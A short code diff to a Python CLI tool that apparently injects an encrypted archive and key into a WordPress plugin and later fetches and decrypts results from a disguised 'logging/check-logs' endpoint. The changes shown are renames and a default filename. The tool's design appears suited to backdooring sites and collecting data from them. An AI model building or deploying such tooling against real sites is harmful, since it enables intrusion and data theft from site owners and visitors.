@@ -1,7 +1,7 @@
 import json
-from tegrity_framework.decrypt import decrypt_res
-from tegrity_framework.injector import Injector
-from tegrity_framework.archive import generate_phar
+from no_tegridy.decrypt import decrypt_res
+from no_tegridy.injector import Injector
+from no_tegridy.archive import generate_phar
 
 import click
 import requests
@@ -56,7 +56,7 @@ def inject(plugin_path, output_path, achive_name, key_file):
         archive_path = path.join(output_path, achive_name)
         generate_phar(archive_path)
 
-        injector.add_file(".key_file", encryption_key.encode())
+        injector.write_file(".key_file", encryption_key.encode())
 
         try:
             injector.inject_archive(archive_path)
@@ -85,7 +85,7 @@ def inject(plugin_path, output_path, achive_name, key_file):
     "--output-file",
     "-o",
     type=click.File("w"),
-    default="logs",
+    default="logs.json",
     help="File to write fetched results to",
 )
 def fetch(url, proxy, key_file, output_file):
@@ -93,6 +93,7 @@ def fetch(url, proxy, key_file, output_file):
 
     api_endpoint = f"{url}/wp-json/logging/check-logs"
 
+    # set proxy object
     if proxy != None:
         proxies = {"http": proxy, "https": proxy}
     else:
